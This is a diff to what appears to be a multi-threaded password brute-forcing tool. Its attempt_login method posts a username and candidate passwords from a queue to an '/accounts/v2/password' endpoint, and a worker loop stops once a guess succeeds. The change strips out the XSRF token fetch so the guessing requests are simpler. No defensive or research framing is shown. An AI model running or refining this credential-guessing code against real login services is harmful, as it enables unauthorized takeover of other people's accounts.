@@ -74,26 +74,12 @@ def attempt_login(self, session, password):
     try:
         print(Fore.CYAN + f"[🧠] Starting login attempt for {self.username}...")
 
-        # Re-fetch XSRF token and update headers
-        login_page = session.get(self.url, headers={"User-Agent": "Mozilla/5.0"})
-        soup = BeautifulSoup(login_page.text, 'html.parser')
-
-        xsrf_token = session.cookies.get("xsrf_token") or soup.find("input", {"name": "xsrf_token"})
-        if hasattr(xsrf_token, 'get'):  # if it's a tag
-            xsrf_token = xsrf_token.get("value")
-
-        if not xsrf_token:
-            print(Fore.YELLOW + "[❌] Missing XSRF token, skipping.")
-            return False
-
-        # Update login POST URL if needed
         parsed = urlparse(self.url)
         post_url = f"{parsed.scheme}://{parsed.netloc}/accounts/v2/password"
 
         payload = {
             "username": self.username,
-            "password": password,
-            "xsrf_token": xsrf_token
+            "password": password
         }
 
         headers = {
@@ -120,7 +106,8 @@ def attempt_login(self, session, password):
 
     except Exception as e:
         print(Fore.RED + f"[Error] Login exception: {e}")
-        return False   
+        return False
+
         
     def worker(self):
         while not self.passwords.empty() and not self.success_flag.is_set() and not self.stop_flag.is_set():
